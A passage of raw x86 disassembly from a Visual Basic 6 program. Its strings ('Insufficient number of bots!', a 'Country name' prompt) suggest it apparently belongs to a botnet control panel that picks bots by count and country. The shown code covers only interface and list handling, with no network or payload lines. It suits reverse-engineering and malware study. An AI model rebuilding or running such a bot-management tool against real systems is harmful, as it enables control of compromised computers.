007F0B6E: mov var_000001F0, ax
007F0B75: lea ecx, var_70
007F0B78: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F0B7D: lea ecx, var_00000094
007F0B83: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F0B88: movsx eax, word ptr var_000001F0
007F0B8F: test eax, eax
007F0B91: jz 007F0C66h
007F0B97: mov var_04, 0000002Eh
007F0B9E: cmp [008F2010h], 00000000h
007F0BA5: jnz 7F0BC2h
007F0BA7: push 008F2010h
007F0BAC: push 00433984h
007F0BB1: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F0BB6: mov var_00000460, 008F2010h
007F0BC0: jmp 7F0BCCh
007F0BC2: mov var_00000460, 008F2010h
007F0BCC: push 00000000h
007F0BCE: push 00000001h
007F0BD0: push 00440E48h
007F0BD5: push 00000000h
007F0BD7: push 00000018h
007F0BD9: mov eax, var_00000460
007F0BDF: mov eax, [eax]
007F0BE1: mov ecx, var_00000460
007F0BE7: mov ecx, [ecx]
007F0BE9: mov ecx, [ecx]
007F0BEB: push eax
007F0BEC: call [ecx+00000550h]
007F0BF2: push eax
007F0BF3: lea eax, var_70
007F0BF6: push eax
007F0BF7: call 00410A84h ; Set (object)
007F0BFC: push eax
007F0BFD: lea eax, var_00000094
007F0C03: push eax
007F0C04: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F0C09: add esp, 00000010h
007F0C0C: push eax
007F0C0D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F0C12: push eax
007F0C13: lea eax, var_74
007F0C16: push eax
007F0C17: call 00410A84h ; Set (object)
007F0C1C: push eax
007F0C1D: lea eax, var_000000A4
007F0C23: push eax
007F0C24: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F0C29: add esp, 00000010h
007F0C2C: push eax
007F0C2D: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F0C32: mov [8F2480h], eax
007F0C37: lea eax, var_74
007F0C3A: push eax
007F0C3B: lea eax, var_70
007F0C3E: push eax
007F0C3F: push 00000002h
007F0C41: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F0C46: add esp, 0000000Ch
007F0C49: lea eax, var_000000A4
007F0C4F: push eax
007F0C50: lea eax, var_00000094
007F0C56: push eax
007F0C57: push 00000002h
007F0C59: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F0C5E: add esp, 0000000Ch
007F0C61: jmp 007F0D00h
007F0C66: mov var_04, 00000030h
007F0C6D: mov eax, [ebp+08h]
007F0C70: mov eax, [eax]
007F0C72: push [ebp+08h]
007F0C75: call [eax+00000300h]
007F0C7B: push eax
007F0C7C: lea eax, var_70
007F0C7F: push eax
007F0C80: call 00410A84h ; Set (object)
007F0C85: mov var_000001F0, eax
007F0C8B: lea eax, var_54
007F0C8E: push eax
007F0C8F: mov eax, var_000001F0
007F0C95: mov eax, [eax]
007F0C97: push var_000001F0
007F0C9D: call [eax+000000A0h]
007F0CA3: fclex 
007F0CA5: mov var_000001F4, eax
007F0CAB: cmp var_000001F4, 00000000h
007F0CB2: jnl 7F0CD7h
007F0CB4: push 000000A0h
007F0CB9: push 00440E08h
007F0CBE: push var_000001F0
007F0CC4: push var_000001F4
007F0CCA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F0CCF: mov var_00000464, eax
007F0CD5: jmp 7F0CDEh
007F0CD7: and var_00000464, 00000000h
007F0CDE: push var_54
007F0CE1: call 004109DCh ; Val(arg_1)
007F0CE6: call 00410814h ; msvbvm60.dll.__vbaFpI4
007F0CEB: mov [8F2480h], eax
007F0CF0: lea ecx, var_54
007F0CF3: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
007F0CF8: lea ecx, var_70
007F0CFB: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F0D00: mov var_04, 00000033h
007F0D07: mov var_00000150, 00000001h
007F0D11: mov var_00000158, 00000002h
007F0D1B: cmp [008F2410h], 00000000h
007F0D22: jnz 7F0D3Fh
007F0D24: push 008F2410h
007F0D29: push 00440E38h
007F0D2E: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F0D33: mov var_00000468, 008F2410h
007F0D3D: jmp 7F0D49h
007F0D3F: mov var_00000468, 008F2410h
007F0D49: mov eax, var_00000468
007F0D4F: mov eax, [eax]
007F0D51: mov var_000001F0, eax
007F0D57: lea eax, var_000001DC
007F0D5D: push eax
007F0D5E: mov eax, var_000001F0
007F0D64: mov eax, [eax]
007F0D66: push var_000001F0
007F0D6C: call [eax+24h]
007F0D6F: fclex 
007F0D71: mov var_000001F4, eax
007F0D77: cmp var_000001F4, 00000000h
007F0D7E: jnl 7F0DA0h
007F0D80: push 00000024h
007F0D82: push 00440E28h
007F0D87: push var_000001F0
007F0D8D: push var_000001F4
007F0D93: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F0D98: mov var_0000046C, eax
007F0D9E: jmp 7F0DA7h
007F0DA0: and var_0000046C, 00000000h
007F0DA7: mov eax, var_000001DC
007F0DAD: mov var_00000160, eax
007F0DB3: mov var_00000168, 00000003h
007F0DBD: mov var_00000170, 00000001h
007F0DC7: mov var_00000178, 00000002h
007F0DD1: lea eax, var_00000158
007F0DD7: push eax
007F0DD8: lea eax, var_00000168
007F0DDE: push eax
007F0DDF: lea eax, var_00000178
007F0DE5: push eax
007F0DE6: lea eax, var_00000260
007F0DEC: push eax
007F0DED: lea eax, var_00000250
007F0DF3: push eax
007F0DF4: lea eax, var_30
007F0DF7: push eax
007F0DF8: call 00410A3Ch ; For
007F0DFD: mov var_000003C0, eax
007F0E03: jmp 007F0EC1h
007F0E08: mov var_04, 00000034h
007F0E0F: cmp [008F2410h], 00000000h
007F0E16: jnz 7F0E33h
007F0E18: push 008F2410h
007F0E1D: push 00440E38h
007F0E22: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F0E27: mov var_00000470, 008F2410h
007F0E31: jmp 7F0E3Dh
007F0E33: mov var_00000470, 008F2410h
007F0E3D: mov eax, var_00000470
007F0E43: mov eax, [eax]
007F0E45: mov var_000001F0, eax
007F0E4B: lea eax, var_30
007F0E4E: push eax
007F0E4F: mov eax, var_000001F0
007F0E55: mov eax, [eax]
007F0E57: push var_000001F0
007F0E5D: call [eax+28h]
007F0E60: fclex 
007F0E62: mov var_000001F4, eax
007F0E68: cmp var_000001F4, 00000000h
007F0E6F: jnl 7F0E91h
007F0E71: push 00000028h
007F0E73: push 00440E28h
007F0E78: push var_000001F0
007F0E7E: push var_000001F4
007F0E84: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F0E89: mov var_00000474, eax
007F0E8F: jmp 7F0E98h
007F0E91: and var_00000474, 00000000h
007F0E98: jmp 007F0D00h
007F0E9D: mov var_04, 00000036h
007F0EA4: lea eax, var_00000260
007F0EAA: push eax
007F0EAB: lea eax, var_00000250
007F0EB1: push eax
007F0EB2: lea eax, var_30
007F0EB5: push eax
007F0EB6: call 00410A36h ; Next
007F0EBB: mov var_000003C0, eax
007F0EC1: cmp var_000003C0, 00000000h
007F0EC8: jnz 007F0E08h
007F0ECE: mov var_04, 00000037h
007F0ED5: mov eax, [ebp+08h]
007F0ED8: mov eax, [eax]
007F0EDA: push [ebp+08h]
007F0EDD: call [eax+00000364h]
007F0EE3: push eax
007F0EE4: lea eax, var_70
007F0EE7: push eax
007F0EE8: call 00410A84h ; Set (object)
007F0EED: mov var_000001F0, eax
007F0EF3: lea eax, var_74
007F0EF6: push eax
007F0EF7: push 00000000h
007F0EF9: mov eax, var_000001F0
007F0EFF: mov eax, [eax]
007F0F01: push var_000001F0
007F0F07: call [eax+40h]
007F0F0A: fclex 
007F0F0C: mov var_000001F4, eax
007F0F12: cmp var_000001F4, 00000000h
007F0F19: jnl 7F0F3Bh
007F0F1B: push 00000040h
007F0F1D: push 00440DE8h
007F0F22: push var_000001F0
007F0F28: push var_000001F4
007F0F2E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F0F33: mov var_00000478, eax
007F0F39: jmp 7F0F42h
007F0F3B: and var_00000478, 00000000h
007F0F42: push 00000000h
007F0F44: push 00000000h
007F0F46: push var_74
007F0F49: lea eax, var_00000094
007F0F4F: push eax
007F0F50: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F0F55: add esp, 00000010h
007F0F58: push eax
007F0F59: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
007F0F5E: sub ax, FFFFh
007F0F62: neg ax
007F0F65: sbb eax, eax
007F0F67: inc eax
007F0F68: neg eax
007F0F6A: mov var_000001F8, ax
007F0F71: lea eax, var_74
007F0F74: push eax
007F0F75: lea eax, var_70
007F0F78: push eax
007F0F79: push 00000002h
007F0F7B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F0F80: add esp, 0000000Ch
007F0F83: lea ecx, var_00000094
007F0F89: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F0F8E: movsx eax, word ptr var_000001F8
007F0F95: test eax, eax
007F0F97: jz 007F163Eh
007F0F9D: mov var_04, 00000038h
007F0FA4: and [008F2484h], 00000000h
007F0FAB: mov var_04, 00000039h
007F0FB2: cmp [008F2010h], 00000000h
007F0FB9: jnz 7F0FD6h
007F0FBB: push 008F2010h
007F0FC0: push 00433984h
007F0FC5: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F0FCA: mov var_0000047C, 008F2010h
007F0FD4: jmp 7F0FE0h
007F0FD6: mov var_0000047C, 008F2010h
007F0FE0: push 00000000h
007F0FE2: push 00000001h
007F0FE4: push 00440E48h
007F0FE9: push 00000000h
007F0FEB: push 00000018h
007F0FED: mov eax, var_0000047C
007F0FF3: mov eax, [eax]
007F0FF5: mov ecx, var_0000047C
007F0FFB: mov ecx, [ecx]
007F0FFD: mov ecx, [ecx]
007F0FFF: push eax
007F1000: call [ecx+00000550h]
007F1006: push eax
007F1007: lea eax, var_70
007F100A: push eax
007F100B: call 00410A84h ; Set (object)
007F1010: push eax
007F1011: lea eax, var_00000094
007F1017: push eax
007F1018: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F101D: add esp, 00000010h
007F1020: push eax
007F1021: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F1026: push eax
007F1027: lea eax, var_74
007F102A: push eax
007F102B: call 00410A84h ; Set (object)
007F1030: push eax
007F1031: lea eax, var_000000A4
007F1037: push eax
007F1038: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F103D: add esp, 00000010h
007F1040: push eax
007F1041: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F1046: xor ecx, ecx
007F1048: cmp [008F2480h], eax
007F104E: setnle cl
007F1051: neg ecx
007F1053: mov var_000001F0, cx
007F105A: lea eax, var_74
007F105D: push eax
007F105E: lea eax, var_70
007F1061: push eax
007F1062: push 00000002h
007F1064: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F1069: add esp, 0000000Ch
007F106C: lea eax, var_000000A4
007F1072: push eax
007F1073: lea eax, var_00000094
007F1079: push eax
007F107A: push 00000002h
007F107C: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F1081: add esp, 0000000Ch
007F1084: movsx eax, word ptr var_000001F0
007F108B: test eax, eax
007F108D: jz 007F1149h
007F1093: mov var_04, 0000003Ah
007F109A: mov var_000000BC, 80020004h
007F10A4: mov var_000000C4, 0000000Ah
007F10AE: mov var_000000AC, 80020004h
007F10B8: mov var_000000B4, 0000000Ah
007F10C2: mov var_0000009C, 80020004h
007F10CC: mov var_000000A4, 0000000Ah
007F10D6: mov var_00000150, 00450854h ; Insufficient number of bots!
007F10E0: mov var_00000158, 00000008h
007F10EA: lea edx, var_00000158
007F10F0: lea ecx, var_00000094
007F10F6: call 004109E2h ; msvbvm60.dll.__vbaVarDup
007F10FB: lea eax, var_000000C4
007F1101: push eax
007F1102: lea eax, var_000000B4
007F1108: push eax
007F1109: lea eax, var_000000A4
007F110F: push eax
007F1110: push 00000010h
007F1112: lea eax, var_00000094
007F1118: push eax
007F1119: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
007F111E: lea eax, var_000000C4
007F1124: push eax
007F1125: lea eax, var_000000B4
007F112B: push eax
007F112C: lea eax, var_000000A4
007F1132: push eax
007F1133: lea eax, var_00000094
007F1139: push eax
007F113A: push 00000004h
007F113C: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F1141: add esp, 00000014h
007F1144: jmp 007F712Eh
007F1149: mov var_04, 0000003Dh
007F1150: or word ptr var_000001D8, FFFFh
007F1158: mov ecx, [008F2480h]
007F115E: call 004108B0h ; msvbvm60.dll.__vbaI2I4
007F1163: mov var_000001D4, ax
007F116A: mov word ptr var_000001D0, 0001h
007F1173: mov ecx, [008F2480h]
007F1179: call 004108B0h ; msvbvm60.dll.__vbaI2I4
007F117E: mov var_000001CC, ax
007F1185: lea eax, var_000001D8
007F118B: push eax
007F118C: lea eax, var_000001D4
007F1192: push eax
007F1193: lea eax, var_000001D0
007F1199: push eax
007F119A: lea eax, var_000001CC
007F11A0: push eax
007F11A1: lea eax, var_00000094
007F11A7: push eax
007F11A8: call 007BC8A7h
007F11AD: lea eax, var_00000094
007F11B3: push eax
007F11B4: push 00002003h
007F11B9: call 0041088Ch ; msvbvm60.dll.__vbaAryVar
007F11BE: mov var_000001DC, eax
007F11C4: lea eax, var_000001DC
007F11CA: push eax
007F11CB: lea eax, var_50
007F11CE: push eax
007F11CF: call 00410892h ; msvbvm60.dll.__vbaAryCopy
007F11D4: lea ecx, var_00000094
007F11DA: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F11DF: mov var_04, 0000003Eh
007F11E6: mov var_00000150, 00000001h
007F11F0: mov var_00000158, 00000002h
007F11FA: mov eax, [8F2480h]
007F11FF: mov var_00000160, eax
007F1205: mov var_00000168, 00000003h
007F120F: mov var_00000170, 00000001h
007F1219: mov var_00000178, 00000002h
007F1223: lea eax, var_00000158
007F1229: push eax
007F122A: lea eax, var_00000168
007F1230: push eax
007F1231: lea eax, var_00000178
007F1237: push eax
007F1238: lea eax, var_00000280
007F123E: push eax
007F123F: lea eax, var_00000270
007F1245: push eax
007F1246: lea eax, var_30
007F1249: push eax
007F124A: call 00410A3Ch ; For
007F124F: mov var_000003C4, eax
007F1255: jmp 007F162Ch
007F125A: mov var_04, 0000003Fh
007F1261: mov var_00000150, 00000001h
007F126B: mov var_00000158, 00000002h
007F1275: lea eax, var_30
007F1278: push eax
007F1279: lea eax, var_00000158
007F127F: push eax
007F1280: lea eax, var_00000094
007F1286: push eax
007F1287: call 004107DEh ; msvbvm60.dll.__vbaVarSub
007F128C: push eax
007F128D: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F1292: push eax
007F1293: push var_50
007F1296: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F129B: mov eax, [eax]
007F129D: mov var_00000160, eax
007F12A3: mov var_00000168, 00000003h
007F12AD: cmp [008F2010h], 00000000h
007F12B4: jnz 7F12D1h
007F12B6: push 008F2010h
007F12BB: push 00433984h
007F12C0: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F12C5: mov var_00000480, 008F2010h
007F12CF: jmp 7F12DBh
007F12D1: mov var_00000480, 008F2010h
007F12DB: push 00000000h
007F12DD: push 00000014h
007F12DF: push 00440E58h
007F12E4: push 00000010h
007F12E6: pop eax
007F12E7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F12EC: lea esi, var_00000168
007F12F2: mov edi, esp
007F12F4: movsd 
007F12F5: movsd 
007F12F6: movsd 
007F12F7: movsd 
007F12F8: push 00000001h
007F12FA: push 00000000h
007F12FC: push 00440E48h
007F1301: push 00000000h
007F1303: push 00000018h
007F1305: mov eax, var_00000480
007F130B: mov eax, [eax]
007F130D: mov ecx, var_00000480
007F1313: mov ecx, [ecx]
007F1315: mov ecx, [ecx]
007F1317: push eax
007F1318: call [ecx+00000550h]
007F131E: push eax
007F131F: lea eax, var_70
007F1322: push eax
007F1323: call 00410A84h ; Set (object)
007F1328: push eax
007F1329: lea eax, var_000000A4
007F132F: push eax
007F1330: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F1335: add esp, 00000010h
007F1338: push eax
007F1339: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F133E: push eax
007F133F: lea eax, var_74
007F1342: push eax
007F1343: call 00410A84h ; Set (object)
007F1348: push eax
007F1349: lea eax, var_000000B4
007F134F: push eax
007F1350: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F1355: add esp, 00000020h
007F1358: push eax
007F1359: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F135E: push eax
007F135F: lea eax, var_78
007F1362: push eax
007F1363: call 00410A84h ; Set (object)
007F1368: push eax
007F1369: lea eax, var_000000C4
007F136F: push eax
007F1370: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F1375: add esp, 00000010h
007F1378: mov var_00000180, 00000001h
007F1382: mov var_00000188, 00000002h
007F138C: lea eax, var_30
007F138F: push eax
007F1390: lea eax, var_00000188
007F1396: push eax
007F1397: lea eax, var_000000D4
007F139D: push eax
007F139E: call 004107DEh ; msvbvm60.dll.__vbaVarSub
007F13A3: push eax
007F13A4: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F13A9: push eax
007F13AA: push var_50
007F13AD: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F13B2: mov eax, [eax]
007F13B4: mov var_00000190, eax
007F13BA: mov var_00000198, 00000003h
007F13C4: cmp [008F2010h], 00000000h
007F13CB: jnz 7F13E8h
007F13CD: push 008F2010h
007F13D2: push 00433984h
007F13D7: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F13DC: mov var_00000484, 008F2010h
007F13E6: jmp 7F13F2h
007F13E8: mov var_00000484, 008F2010h
007F13F2: push 00000000h
007F13F4: push 00000014h
007F13F6: push 00440E58h
007F13FB: push 00000010h
007F13FD: pop eax
007F13FE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F1403: lea esi, var_00000198
007F1409: mov edi, esp
007F140B: movsd 
007F140C: movsd 
007F140D: movsd 
007F140E: movsd 
007F140F: push 00000001h
007F1411: push 00000000h
007F1413: push 00440E48h
007F1418: push 00000000h
007F141A: push 00000018h
007F141C: mov eax, var_00000484
007F1422: mov eax, [eax]
007F1424: mov ecx, var_00000484
007F142A: mov ecx, [ecx]
007F142C: mov ecx, [ecx]
007F142E: push eax
007F142F: call [ecx+00000550h]
007F1435: push eax
007F1436: lea eax, var_7C
007F1439: push eax
007F143A: call 00410A84h ; Set (object)
007F143F: push eax
007F1440: lea eax, var_000000E4
007F1446: push eax
007F1447: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F144C: add esp, 00000010h
007F144F: push eax
007F1450: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F1455: push eax
007F1456: lea eax, var_80
007F1459: push eax
007F145A: call 00410A84h ; Set (object)
007F145F: push eax
007F1460: lea eax, var_000000F4
007F1466: push eax
007F1467: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F146C: add esp, 00000020h
007F146F: push eax
007F1470: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F1475: push eax
007F1476: lea eax, var_00000084
007F147C: push eax
007F147D: call 00410A84h ; Set (object)
007F1482: push eax
007F1483: lea eax, var_00000104
007F1489: push eax
007F148A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F148F: add esp, 00000010h
007F1492: cmp [008F2410h], 00000000h
007F1499: jnz 7F14B6h
007F149B: push 008F2410h
007F14A0: push 00440E38h
007F14A5: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F14AA: mov var_00000488, 008F2410h
007F14B4: jmp 7F14C0h
007F14B6: mov var_00000488, 008F2410h
007F14C0: mov eax, var_00000488
007F14C6: mov eax, [eax]
007F14C8: mov var_000001F0, eax
007F14CE: mov var_0000013C, 80020004h
007F14D8: mov var_00000144, 0000000Ah
007F14E2: mov var_0000012C, 80020004h
007F14EC: mov var_00000134, 0000000Ah
007F14F6: lea eax, var_00000104
007F14FC: push eax
007F14FD: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F1502: mov var_0000011C, eax
007F1508: mov var_00000124, 00000008h
007F1512: lea eax, var_000000C4
007F1518: push eax
007F1519: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F151E: mov var_0000010C, eax
007F1524: mov var_00000114, 00000008h
007F152E: lea eax, var_00000144
007F1534: push eax
007F1535: lea eax, var_00000134
007F153B: push eax
007F153C: lea eax, var_00000124
007F1542: push eax
007F1543: lea eax, var_00000114
007F1549: push eax
007F154A: mov eax, var_000001F0
007F1550: mov eax, [eax]
007F1552: push var_000001F0
007F1558: call [eax+20h]
007F155B: fclex 
007F155D: mov var_000001F4, eax
007F1563: cmp var_000001F4, 00000000h
007F156A: jnl 7F158Ch
007F156C: push 00000020h
007F156E: push 00440E28h
007F1573: push var_000001F0
007F1579: push var_000001F4
007F157F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F1584: mov var_0000048C, eax
007F158A: jmp 7F1593h
007F158C: and var_0000048C, 00000000h
007F1593: lea eax, var_00000084
007F1599: push eax
007F159A: lea eax, var_80
007F159D: push eax
007F159E: lea eax, var_7C
007F15A1: push eax
007F15A2: lea eax, var_78
007F15A5: push eax
007F15A6: lea eax, var_74
007F15A9: push eax
007F15AA: lea eax, var_70
007F15AD: push eax
007F15AE: push 00000006h
007F15B0: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F15B5: add esp, 0000001Ch
007F15B8: lea eax, var_00000144
007F15BE: push eax
007F15BF: lea eax, var_00000134
007F15C5: push eax
007F15C6: lea eax, var_00000124
007F15CC: push eax
007F15CD: lea eax, var_00000114
007F15D3: push eax
007F15D4: lea eax, var_00000104
007F15DA: push eax
007F15DB: lea eax, var_000000F4
007F15E1: push eax
007F15E2: lea eax, var_000000E4
007F15E8: push eax
007F15E9: lea eax, var_000000C4
007F15EF: push eax
007F15F0: lea eax, var_000000B4
007F15F6: push eax
007F15F7: lea eax, var_000000A4
007F15FD: push eax
007F15FE: push 0000000Ah
007F1600: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F1605: add esp, 0000002Ch
007F1608: mov var_04, 00000040h
007F160F: lea eax, var_00000280
007F1615: push eax
007F1616: lea eax, var_00000270
007F161C: push eax
007F161D: lea eax, var_30
007F1620: push eax
007F1621: call 00410A36h ; Next
007F1626: mov var_000003C4, eax
007F162C: cmp var_000003C4, 00000000h
007F1633: jnz 007F125Ah
007F1639: jmp 007F3E47h
007F163E: mov var_04, 00000041h
007F1645: mov eax, [ebp+08h]
007F1648: mov eax, [eax]
007F164A: push [ebp+08h]
007F164D: call [eax+00000364h]
007F1653: push eax
007F1654: lea eax, var_70
007F1657: push eax
007F1658: call 00410A84h ; Set (object)
007F165D: mov var_000001F0, eax
007F1663: lea eax, var_74
007F1666: push eax
007F1667: push 00000001h
007F1669: mov eax, var_000001F0
007F166F: mov eax, [eax]
007F1671: push var_000001F0
007F1677: call [eax+40h]
007F167A: fclex 
007F167C: mov var_000001F4, eax
007F1682: cmp var_000001F4, 00000000h
007F1689: jnl 7F16ABh
007F168B: push 00000040h
007F168D: push 00440DE8h
007F1692: push var_000001F0
007F1698: push var_000001F4
007F169E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F16A3: mov var_00000490, eax
007F16A9: jmp 7F16B2h
007F16AB: and var_00000490, 00000000h
007F16B2: push 00000000h
007F16B4: push 00000000h
007F16B6: push var_74
007F16B9: lea eax, var_00000094
007F16BF: push eax
007F16C0: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F16C5: add esp, 00000010h
007F16C8: push eax
007F16C9: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
007F16CE: sub ax, FFFFh
007F16D2: neg ax
007F16D5: sbb eax, eax
007F16D7: inc eax
007F16D8: neg eax
007F16DA: mov var_000001F8, ax
007F16E1: lea eax, var_74
007F16E4: push eax
007F16E5: lea eax, var_70
007F16E8: push eax
007F16E9: push 00000002h
007F16EB: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F16F0: add esp, 0000000Ch
007F16F3: lea ecx, var_00000094
007F16F9: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F16FE: movsx eax, word ptr var_000001F8
007F1705: test eax, eax
007F1707: jz 007F2372h
007F170D: mov var_04, 00000042h
007F1714: mov [008F2484h], 00000001h
007F171E: mov var_04, 00000043h
007F1725: mov var_000000EC, 80020004h
007F172F: mov var_000000F4, 0000000Ah
007F1739: mov var_000000DC, 80020004h
007F1743: mov var_000000E4, 0000000Ah
007F174D: mov var_000000CC, 80020004h
007F1757: mov var_000000D4, 0000000Ah
007F1761: mov var_000000BC, 80020004h
007F176B: mov var_000000C4, 0000000Ah
007F1775: mov var_000000AC, 80020004h
007F177F: mov var_000000B4, 0000000Ah
007F1789: mov var_0000009C, 80020004h
007F1793: mov var_000000A4, 0000000Ah
007F179D: mov var_00000150, 00450894h ; Country name
007F17A7: mov var_00000158, 00000008h
007F17B1: lea edx, var_00000158
007F17B7: lea ecx, var_00000094
007F17BD: call 004109E2h ; msvbvm60.dll.__vbaVarDup
007F17C2: lea eax, var_000000F4
007F17C8: push eax
007F17C9: lea eax, var_000000E4
007F17CF: push eax
007F17D0: lea eax, var_000000D4
007F17D6: push eax
007F17D7: lea eax, var_000000C4
007F17DD: push eax
007F17DE: lea eax, var_000000B4
007F17E4: push eax
007F17E5: lea eax, var_000000A4
007F17EB: push eax
007F17EC: lea eax, var_00000094
007F17F2: push eax
007F17F3: call 00410994h ; InputBox
007F17F8: mov edx, eax
007F17FA: lea ecx, var_4C
007F17FD: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F1802: lea eax, var_000000F4
007F1808: push eax
007F1809: lea eax, var_000000E4
007F180F: push eax
007F1810: lea eax, var_000000D4
007F1816: push eax
007F1817: lea eax, var_000000C4
007F181D: push eax
007F181E: lea eax, var_000000B4
007F1824: push eax
007F1825: lea eax, var_000000A4
007F182B: push eax
007F182C: lea eax, var_00000094
007F1832: push eax
007F1833: push 00000007h
007F1835: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F183A: add esp, 00000020h
007F183D: mov var_04, 00000044h
007F1844: mov var_00000150, 00000001h
007F184E: mov var_00000158, 00000002h
007F1858: cmp [008F2010h], 00000000h
007F185F: jnz 7F187Ch
007F1861: push 008F2010h
007F1866: push 00433984h
007F186B: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F1870: mov var_00000494, 008F2010h
007F187A: jmp 7F1886h
007F187C: mov var_00000494, 008F2010h
007F1886: push 00000000h
007F1888: push 00000001h
007F188A: push 00440E48h
007F188F: push 00000000h
007F1891: push 00000018h
007F1893: mov eax, var_00000494
007F1899: mov eax, [eax]
007F189B: mov ecx, var_00000494
007F18A1: mov ecx, [ecx]
007F18A3: mov ecx, [ecx]
007F18A5: push eax
007F18A6: call [ecx+00000550h]
007F18AC: push eax
007F18AD: lea eax, var_70
007F18B0: push eax
007F18B1: call 00410A84h ; Set (object)
007F18B6: push eax
007F18B7: lea eax, var_00000094
007F18BD: push eax
007F18BE: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F18C3: add esp, 00000010h
007F18C6: push eax
007F18C7: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F18CC: push eax
007F18CD: lea eax, var_74
007F18D0: push eax
007F18D1: call 00410A84h ; Set (object)
007F18D6: push eax
007F18D7: lea eax, var_000000A4
007F18DD: push eax
007F18DE: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F18E3: add esp, 00000010h
007F18E6: push eax
007F18E7: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F18EC: mov var_00000160, eax
007F18F2: mov var_00000168, 00000003h
007F18FC: mov var_00000170, 00000001h
007F1906: mov var_00000178, 00000002h
007F1910: lea eax, var_00000158
007F1916: push eax
007F1917: lea eax, var_00000168
007F191D: push eax
007F191E: lea eax, var_00000178
007F1924: push eax
007F1925: lea eax, var_000002A0
007F192B: push eax
007F192C: lea eax, var_00000290
007F1932: push eax
007F1933: lea eax, var_30
007F1936: push eax
007F1937: call 00410A3Ch ; For
007F193C: mov var_000003C8, eax
007F1942: lea eax, var_74
007F1945: push eax
007F1946: lea eax, var_70
007F1949: push eax
007F194A: push 00000002h
007F194C: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F1951: add esp, 0000000Ch
007F1954: lea eax, var_000000A4
007F195A: push eax
007F195B: lea eax, var_00000094
007F1961: push eax
007F1962: push 00000002h
007F1964: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F1969: add esp, 0000000Ch
007F196C: jmp 007F1B6Ch
007F1971: mov var_04, 00000045h
007F1978: mov var_00000160, 0000000Eh
007F1982: mov var_00000168, 00000003h
007F198C: lea eax, var_30
007F198F: mov var_00000150, eax
007F1995: mov var_00000158, 0000400Ch
007F199F: cmp [008F2010h], 00000000h
007F19A6: jnz 7F19C3h
007F19A8: push 008F2010h
007F19AD: push 00433984h
007F19B2: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F19B7: mov var_00000498, 008F2010h
007F19C1: jmp 7F19CDh
007F19C3: mov var_00000498, 008F2010h
007F19CD: push 00000010h
007F19CF: pop eax
007F19D0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F19D5: lea esi, var_00000168
007F19DB: mov edi, esp
007F19DD: movsd 
007F19DE: movsd 
